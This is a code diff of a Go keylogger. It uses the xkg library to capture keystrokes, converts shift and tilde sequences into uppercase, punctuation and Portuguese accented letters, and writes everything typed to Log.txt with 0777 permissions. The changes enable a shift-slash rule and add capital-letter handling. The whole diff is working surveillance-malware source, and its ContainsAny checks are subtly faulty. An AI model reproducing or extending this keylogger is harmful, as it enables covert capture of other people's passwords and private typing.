@@ -4,6 +4,7 @@ package main
 import "github.com/LuccaPrado/xkg"
 import "io/ioutil"
 import "strings" 
+
 var armazenar, nova string
 
 func main() {
@@ -18,6 +19,7 @@ func main() {
 			
             armazenar += key
             nova = armazenar
+            
 			//teste de acentuação com ~
             if strings.ContainsAny(armazenar, "~a"){
 				nova = strings.Replace(armazenar, "~a", "ã", -1)
@@ -144,10 +146,10 @@ func main() {
 				armazenar = nova
 				}
 			
-			/*if strings.ContainsAny(armazenar, "<shift>/"){
+			if strings.ContainsAny(armazenar, "<shift>/"){
 				nova = strings.Replace(armazenar, "<shift>/", "?", -1)
 				armazenar = nova
-				}*/
+				}
 			if strings.ContainsAny(armazenar, "<shift>;"){
 				nova = strings.Replace(armazenar, "<shift>;", ":", -1)
 				armazenar = nova
@@ -160,7 +162,11 @@ func main() {
 				nova = strings.Replace(armazenar, "<shift>.", ">", -1)
 				armazenar = nova
 				}
-			
+				
+			if strings.ContainsAny(armazenar, "<shift>"+key){//maiúsculo
+				nova = strings.Replace(armazenar, "<shift>"+key, strings.ToUpper(key), -1)
+				armazenar = nova
+				}
             ioutil.WriteFile("Log.txt", []byte(armazenar), 0777)
         }
        
